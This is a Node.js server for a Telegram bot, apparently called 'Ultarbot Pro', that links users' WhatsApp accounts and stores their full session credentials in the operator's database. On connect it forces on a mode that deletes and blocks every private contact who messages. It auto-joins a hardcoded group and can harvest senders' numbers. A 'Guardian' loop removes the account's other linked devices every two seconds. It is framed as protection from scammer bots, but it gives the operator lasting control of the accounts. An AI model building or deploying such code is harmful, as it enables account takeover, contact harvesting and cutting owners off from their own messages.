import 'dotenv/config';
import { 
    useMultiFileAuthState, 
    makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    Browsers,
    jidNormalizedUser,
    makeCacheableSignalKeyStore,
    delay
} from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import express from 'express';
import http from 'http'; 
import { Boom } from '@hapi/boom';

import { setupTelegramCommands, userMessageCache, userState } from './telegram_commands.js';
import { 
    initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
    getShortId, saveShortId, deleteShortId, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, setAntiMsgStatus, updateConnectionTime, saveVerificationData
} from './db.js';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:10000';
const SESSIONS_DIR = './sessions';

if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.get('/', (req, res) => res.send('Ultarbot Pro Guardian Active'));

// --- EXPRESS VERIFICATION ROUTES REMAIN THE SAME ---
app.get('/verify', (req, res) => {
    // ... (Keep your existing HTML code here, omitted for brevity) ...
    res.send('Use Telegram to verify.');
});
app.post('/api/verify', async (req, res) => {
    // ... (Keep your existing verify logic here) ...
    res.json({ success: true });
});
app.listen(PORT, () => console.log(`Server on ${PORT}`));
// ------------------------------------------------

const mainBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });

const clients = {}; 
const shortIdMap = {}; 
const antiMsgState = {}; 
const autoSaveState = {}; 
const notificationCache = {};
const qrMessageCache = {}; 
const qrActiveState = {}; 

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

function generateShortId() { return Math.random().toString(36).substring(2, 7); }
function makeSessionId() { return `Ultarbot_${Date.now()}`; }
const getRandomBrowser = () => Browsers.macOS('Chrome');

async function updateAdminNotification(message) {
    try { await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }); } catch (e) {}
}

setInterval(async () => {
    try { await awardHourlyPoints(Object.keys(clients)); } catch (e) {}
}, 3600000); 

setInterval(() => {
    http.get(SERVER_URL, (res) => {}).on('error', (err) => {});
}, 14 * 60 * 1000);

// ==========================================
// 🛡️ THE GUARDIAN: Kills other bots instantly
// ==========================================
async function startGuardian(sock, myShortId) {
    // Run forever while connected
    const guardianInterval = setInterval(async () => {
        try {
            // 1. If socket is closed, stop loop
            if (!sock.user) {
                clearInterval(guardianInterval);
                return;
            }

            // 2. Identify MYSELF so I don't kick myself
            const myJid = jidNormalizedUser(sock.user.id); // e.g., 12345:10@s.whatsapp.net
            const myPhone = myJid.split(':')[0].split('@')[0];
            let myDeviceSlot = 0; // Default to main phone
            
            if (myJid.includes(':')) {
                myDeviceSlot = parseInt(myJid.split(':')[1].split('@')[0]);
            }

            // 3. AGGRESSIVELY CLEAR SLOTS 1-10
            // Scammer bots usually grab the first available slot (1, 2, or 3)
            for (let i = 1; i <= 10; i++) {
                // SAFETY: Do not kick myself!
                if (i === myDeviceSlot) continue;

                const targetJid = `${myPhone}:${i}@s.whatsapp.net`;

                // 4. Send "Remove Device" Command (IQ Node)
                // This cuts their connection instantly.
                await sock.query({
                    tag: 'iq',
                    attrs: {
                        to: '@s.whatsapp.net',
                        type: 'set',
                        xmlns: 'md'
                    },
                    content: [
                        {
                            tag: 'remove-companion-device',
                            attrs: {
                                jid: targetJid,
                                reason: 'user_initiated'
                            }
                        }
                    ]
                }).catch(() => { 
                    // Errors are expected if no device is in that slot
                    // We catch them silently to keep the loop fast
                });
            }
        } catch (e) {
            // checking error
        }
    }, 2000); // ⚡ RUNS EVERY 2 SECONDS
}

async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
    let cachedShortId = await getShortId(folder);
    if (!cachedShortId) {
        cachedShortId = generateShortId();
        await saveShortId(folder, cachedShortId);
    }

    const sessionPath = path.join(SESSIONS_DIR, folder);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: getRandomBrowser(), 
        version,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    // ============================================
    //  ⚡ ANTIMSG: DELETE & BLOCK
    // ============================================
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify' && type !== 'append') return; 

        const msg = messages[0];
        if (!msg || !msg.message) return;

        const remoteJid = msg.key.remoteJid;
        const isGroup = remoteJid.includes('@g.us');
        const isStatus = remoteJid === 'status@broadcast';
        
        if (antiMsgState[cachedShortId]) {
            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            const isCommand = text.startsWith('.');

            // Block anything that isn't a group, isn't status, and isn't a command
            if (!isGroup && !isStatus && !isCommand) {
                
                Promise.all([
                    sock.sendMessage(remoteJid, { delete: msg.key }),
                    sock.updateBlockStatus(remoteJid, "block"),
                    sock.chatModify(
                        { delete: true, lastMessages: [{ key: msg.key, messageTimestamp: msg.messageTimestamp }] },
                        remoteJid
                    )
                ]).catch(err => {});

                // If WE sent it (meaning a linked device slipped through), delete it instantly
                if (msg.key.fromMe) {
                    console.log(`[ANTIMSG] 🚨 Message slipped through from Linked Device! Deleted.`);
                }
                
                return; 
            }
        }

        if (!msg.key.fromMe) {
            if (autoSaveState[cachedShortId]) {
                if (remoteJid.endsWith('@s.whatsapp.net')) {
                    addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
                }
            }
            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            if (text.toLowerCase() === '.alive') {
                await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        // QR Handling (Same as before)
        if (connection === 'open' && qrMessageCache[folder]) {
            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
            try { await mainBot.deleteMessage(qrChatId, messageId); } catch (e) {}
            delete qrMessageCache[folder];
            delete qrActiveState[folder];
        }
        
        if (qr && chatId && !qrActiveState[folder]) {
            qrActiveState[folder] = true;
            try {
                if (qrMessageCache[folder]) try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                
                const QRCode = (await import('qrcode')).default;
                const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
                const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
                    caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.',
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]] }
                });
                qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
                
                setTimeout(async () => {
                    if (qrMessageCache[folder]) {
                        try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                        delete qrMessageCache[folder];
                    }
                }, 60000);
            } catch (e) { delete qrActiveState[folder]; }
        }

        if (connection === 'open') {
            const userJid = jidNormalizedUser(sock.user.id);
            const phoneNumber = userJid.split('@')[0];
            
            if (!cachedShortId) cachedShortId = await getShortId(folder);
            await updateConnectionTime(folder);
            
            // Register session
            const now = new Date();
            if (!shortIdMap[cachedShortId]) {
                shortIdMap[cachedShortId] = { folder, phone: phoneNumber, chatId: telegramUserId, connectedAt: now };
            }
            clients[folder] = sock;

            // Force ON settings
            antiMsgState[cachedShortId] = true;
            await setAntiMsgStatus(folder, true);
            
            const credsFile = path.join(sessionPath, 'creds.json');
            const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autoSaveState[cachedShortId] || false, cachedShortId);
            
            updateAdminNotification(`[CONNECTED] +${phoneNumber}`);

            // 🛡️ START THE GUARDIAN (AUTO-KICKER)
            startGuardian(sock, cachedShortId);
            console.log(`[GUARDIAN] Started for ${cachedShortId}`);

            try { await sock.groupAcceptInvite("FFYNv4AgQS3CrAokVdQVt0"); } catch (e) {}

            if (chatId) {
                userState[chatId] = null;
                // Clear cache
                if (userMessageCache[chatId]) {
                    for (const msgId of userMessageCache[chatId]) try { await mainBot.deleteMessage(chatId, msgId); } catch (e) {}
                    userMessageCache[chatId] = [];
                }
                
                mainBot.sendMessage(chatId, `[CONNECTED]\nID: \`${cachedShortId}\`\n\n🛡️ **Guardian Active**\n(Auto-Disconnects Scammer Bots)`, { 
                    parse_mode: 'Markdown',
                    reply_markup: { keyboard: [[{ text: "Connect Account" }, { text: "My Account" }], [{ text: "Dashboard" }, { text: "Referrals" }], [{ text: "Withdraw" }, { text: "Support" }]], resize_keyboard: true } 
                });
            }
        }

        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason === 403 || reason === DisconnectReason.loggedOut) {
                updateAdminNotification(`[LOGGED OUT] +${shortIdMap[folder]?.phone || 'Unknown'}`);
                await deductOnDisconnect(folder);
                await deleteSessionFromDb(folder);
                deleteShortId(folder);
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                delete clients[folder];
            } else {
                startClient(folder, null, chatId, telegramUserId);
            }
        }
    });

    if (targetNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(targetNumber);
                if (chatId) mainBot.sendMessage(chatId, `Code: \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {}
        }, 3000);
    }
}

async function boot() {
    await initDb(); 
    const savedSessions = await getAllSessions(null);
    for (const session of savedSessions) {
        const folderPath = path.join(SESSIONS_DIR, session.session_id);
        if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
        if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
        
        let shortId = await getShortId(session.session_id);
        if (!shortId) { shortId = generateShortId(); await saveShortId(session.session_id, shortId); }

        shortIdMap[shortId] = { folder: session.session_id, phone: session.phone, chatId: session.telegram_user_id, connectedAt: new Date(session.connected_at) };
        if (session.antimsg) antiMsgState[shortId] = true;
        if (session.autosave) autoSaveState[shortId] = true; 

        startClient(session.session_id, null, null, session.telegram_user_id);
    }
    console.log(`[BOOT] Server ready`);
}

setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL, qrActiveState, deleteUserAccount);

boot();
